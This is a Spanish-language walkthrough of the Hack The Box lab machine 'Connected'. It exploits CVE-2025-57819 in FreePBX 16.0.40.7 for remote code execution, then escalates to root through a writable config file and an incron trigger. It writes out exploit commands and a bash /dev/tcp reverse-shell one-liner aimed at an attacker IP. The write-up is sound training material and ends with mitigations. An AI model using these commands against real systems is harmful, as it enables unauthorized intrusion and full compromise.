# Connected 

**Plataforma:** Hack The Box  
**Dificultad:** Fácil  
**Categoría:** Linux / Web / FreePBX / RCE / Incron

## 1. Reconocimiento

### Conectividad

- Primero comprobamos que tenemos conectividad con el objetivo realizando un único `ping`:

```bash
ping -c1 10.129.112.183
```

### Nmap

- Lanzamos un escaneo para identificar los puertos y servicios:

```bash
nmap -sCV -Pn 10.129.112.183
```

- Encontramos:

- `22/tcp` → SSH
- `80/tcp` → HTTP
- `443/tcp` → HTTPS

- Al acceder mediante HTTP, el servidor nos redirige al dominio:

```text
http://connected.htb/
```

- Añadimos el dominio a nuestra resolución local:

```bash
sudo nano /etc/hosts
```

- Añadimos:

```text
10.129.112.183 connected.htb
```

- Ahora podemos acceder correctamente mediante:

```text
http://connected.htb/
```

## 2. Enumeración

### Panel de configuración

- Accedemos a:

```text
http://connected.htb/admin/config.php
```

- Encontramos un panel de configuración.

- También observamos una clave:

```text
einqgiq5d4gccva8rk0rg6pafs
```

- La guardamos por si resulta útil posteriormente.

### Identificación del software

- En la aplicación identificamos:

```text
FreePBX 16.0.40.7
```

- **FreePBX** es una interfaz web utilizada para administrar sistemas de telefonía IP basados en Asterisk.

- Tener identificada la versión exacta es importante porque podemos buscar vulnerabilidades específicas para ella.

### Fuzzing

- Realizamos fuzzing para descubrir más recursos:

```bash
ffuf -u http://connected.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt
```

- Encontramos:

```text
/robots.txt
```

- Lo revisamos:

```text
User-agent: *
Disallow: /
```

- El `robots.txt` no nos proporciona directamente una credencial ni un acceso, pero confirma que existen recursos que el administrador no quiere que sean indexados.

### Búsqueda de vulnerabilidades

- Buscamos vulnerabilidades relacionadas con la versión:

```text
FreePBX 16.0.40.7
```

- Encontramos una vulnerabilidad de **Remote Code Execution (RCE)**:

```text
CVE-2025-57819
```

- Utilizamos el exploit disponible en:

```text
https://github.com/0xEhab/FreePBX-CVE-2025-57819-RCE
```

## 3. Explotación

### Comprobar RCE

- Primero comprobamos si el exploit nos permite ejecutar comandos remotamente:

```bash
python3 exploit.py --rhost connected.htb --command "id"
```

- Si la respuesta devuelve información del usuario y grupos, confirmamos que tenemos **RCE**.

### Reverse Shell

- Una vez confirmada la ejecución remota de comandos, aprovechamos la vulnerabilidad para obtener una reverse shell:

```bash
python3 exploit.py --rhost connected.htb --lhost 10.10.14.11 --lport 4444
```

- En nuestra máquina nos ponemos a la escucha:

```bash
nc -lvnp 4444
```

- Recibimos la conexión y comprobamos el usuario:

```bash
whoami
```

- Obtenemos:

```text
asterisk
```

- Por tanto, hemos conseguido acceso inicial como el usuario `asterisk`.

### User Flag

- Nos desplazamos al directorio personal:

```bash
cd /home/asterisk
```

- Listamos el contenido:

```bash
ls
```

- Encontramos y leemos la User Flag:

```bash
cat user.txt
```

### Mejorar la shell

- Para obtener una terminal más funcional utilizamos Python:

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

## 4. Escalada de privilegios

### Enumeración de sudo

- Comprobamos si el usuario `asterisk` puede ejecutar comandos como otro usuario:

```bash
sudo -l
```

- El sistema solicita la contraseña de `asterisk`, por lo que este vector no nos resulta útil.

### Enumeración de SUID

- Buscamos binarios con el bit SUID:

```bash
find / -perm -4000 -type f 2>/dev/null
```

- No encontramos ningún binario interesante para escalar privilegios.

### Enumeración de capabilities

- Buscamos capabilities asignadas a ejecutables:

```bash
getcap -r / 2>/dev/null
```

- Tampoco encontramos un vector útil.

### Archivos de configuración modificables

- Como los métodos anteriores no nos proporcionan una vía clara, buscamos archivos de configuración que podamos modificar:

```bash
find /etc -name "*.conf" -writable 2>/dev/null
```

- Encontramos:

```text
/etc/dahdi/init.conf
```

- Ahora necesitamos comprobar si algún proceso utiliza este archivo y si existe algún mecanismo automático que se ejecute cuando este archivo cambie.

### Incron

- Revisamos las reglas de `incron`:

```bash
cat /etc/incron.d/*
```

- Encontramos:

```text
/var/spool/asterisk/sysadmin/dahdi_restart IN_CLOSE_WRITE /usr/sbin/sysadmin_dahdi_restart
```

- Esta línea es extremadamente importante.

### ¿Qué significa?

`incron` es parecido a `cron`, pero en lugar de ejecutar algo a una hora concreta, permite ejecutar un comando cuando ocurre un evento sobre un archivo o directorio.

En nuestro caso:

```text
/var/spool/asterisk/sysadmin/dahdi_restart
```

está siendo vigilado mediante el evento:

```text
IN_CLOSE_WRITE
```

`IN_CLOSE_WRITE` significa que el archivo ha sido abierto para escritura y posteriormente cerrado.

Cuando ese evento ocurre, `incron` ejecuta:

```text
/usr/sbin/sysadmin_dahdi_restart
```

Por tanto, tenemos esta cadena:

```text
Modificamos archivo
      ↓
Archivo se cierra después de escribir
      ↓
incron detecta IN_CLOSE_WRITE
      ↓
Ejecuta /usr/sbin/sysadmin_dahdi_restart
```

### Aprovechar la configuración

- Además, podemos modificar:

```text
/etc/dahdi/init.conf
```

- Esto es importante porque el proceso que posteriormente se ejecuta puede leer o utilizar este archivo con privilegios elevados.

- Añadimos nuestro comando al final del archivo:

```bash
echo 'bash -c "bash -i >& /dev/tcp/10.10.14.11/4545 0>&1"' >> /etc/dahdi/init.conf
```

- Con esto introducimos una reverse shell que se conectará a nuestra máquina por el puerto `4545`.

### Activar el trigger de incron

- Ahora escribimos en el archivo vigilado para provocar el evento `IN_CLOSE_WRITE`:

```bash
echo "Restart" >> /var/spool/asterisk/sysadmin/dahdi_restart
```

- Al cerrar el archivo después de escribir:

```text
dahdi_restart
      ↓
IN_CLOSE_WRITE
      ↓
incron
      ↓
/usr/sbin/sysadmin_dahdi_restart
      ↓
se procesa /etc/dahdi/init.conf
      ↓
se ejecuta nuestra reverse shell
```

- Importante: **no estamos reiniciando el sistema completo**. Lo que hacemos es modificar el archivo que `incron` está vigilando para que detecte el evento y ejecute el script configurado.

### Obtener la shell como root

- Nos ponemos a la escucha:

```bash
nc -lvnp 4545
```

- Esperamos a que `incron` detecte el cambio y ejecute:

```text
/usr/sbin/sysadmin_dahdi_restart
```

- Recibimos una nueva reverse shell.

- Comprobamos nuestro usuario:

```bash
whoami
```

- Obtenemos:

```text
root
```

- Ya tenemos privilegios máximos sobre la máquina.

### Root Flag

- Nos desplazamos al directorio `/root`:

```bash
cd /root
```

- Listamos los archivos:

```bash
ls
```

- Leemos la Root Flag:

```bash
cat root.txt
```

## 5. Reporte

- La máquina **Connected** expone los servicios SSH, HTTP y HTTPS.
- La aplicación web utiliza **FreePBX 16.0.40.7**.
- Tras identificar la versión, encontramos una vulnerabilidad de **RCE** asociada a **CVE-2025-57819**.
- Utilizamos el exploit para ejecutar comandos remotamente y posteriormente obtenemos una reverse shell como `asterisk`.
- Tras conseguir acceso inicial, `sudo -l`, SUID y capabilities no proporcionan un vector útil.
- Continuamos con la enumeración y encontramos un archivo de configuración modificable:
```text
/etc/dahdi/init.conf
```
- Al revisar `/etc/incron.d/` descubrimos una regla que vigila:
```text
/var/spool/asterisk/sysadmin/dahdi_restart
```
- Cuando este archivo es modificado y cerrado, `incron` ejecuta:
```text
/usr/sbin/sysadmin_dahdi_restart
```
- Aprovechamos esta cadena para introducir una reverse shell en `init.conf` y después modificamos `dahdi_restart` para activar el evento `IN_CLOSE_WRITE`.
- El proceso se ejecuta con privilegios elevados y recibimos una reverse shell como `root`.
- Finalmente obtenemos la Root Flag.

### Cadena de ataque

```text
Nmap
 ↓
HTTP / HTTPS
 ↓
FreePBX 16.0.40.7
 ↓
CVE-2025-57819
 ↓
RCE
 ↓
Reverse Shell
 ↓
asterisk
 ↓
sudo / SUID / Capabilities
 ↓
/etc/dahdi/init.conf
 ↓
/etc/incron.d/
 ↓
IN_CLOSE_WRITE
 ↓
sysadmin_dahdi_restart
 ↓
Reverse Shell
 ↓
root
 ↓
Root Flag
```

### Vulnerabilidades encontradas

| Vulnerabilidad | Severidad | Impacto |
|---|---|---|
| FreePBX vulnerable a CVE-2025-57819 | Crítica | Permite RCE remoto |
| Archivo `/etc/dahdi/init.conf` modificable | Alta | Permite modificar la configuración utilizada durante el proceso |
| Regla `incron` explotable | Crítica | Permite encadenar una modificación de archivo con ejecución privilegiada |

### Mitigaciones

- Actualizar FreePBX a una versión corregida.
- Restringir el acceso a interfaces administrativas.
- Aplicar el principio de mínimo privilegio a los servicios de Asterisk.
- Revisar qué archivos de configuración pueden modificar usuarios no privilegiados.
- Revisar las reglas de `incron` y evitar que ejecuten scripts privilegiados basándose únicamente en archivos modificables por usuarios de menor privilegio.
- Proteger los archivos utilizados por procesos privilegiados.
- Monitorizar modificaciones sospechosas en archivos de configuración.

## 🧠 Lessons Learned

- Identificar la versión exacta de una aplicación facilita la búsqueda de vulnerabilidades específicas.
- Una RCE web puede utilizarse para conseguir acceso inicial y posteriormente una reverse shell.
- Si `sudo`, SUID y capabilities no ofrecen un vector, hay que seguir enumerando servicios, configuraciones y tareas automáticas.
- `incron` funciona reaccionando a eventos del sistema de archivos, a diferencia de `cron`, que se basa principalmente en horarios.
- `IN_CLOSE_WRITE` se dispara cuando un archivo abierto para escritura se cierra después de haber sido modificado.
- Una regla de `incron` puede ser peligrosa si ejecuta un proceso privilegiado cuando un usuario sin privilegios puede modificar el archivo vigilado.
- La escalada en esta máquina no consiste en reiniciar el sistema, sino en provocar el evento de archivo que hace que `incron` ejecute el proceso configurado.
- La combinación de un archivo modificable + un proceso privilegiado + un trigger automático puede convertirse en una escalada de privilegios.
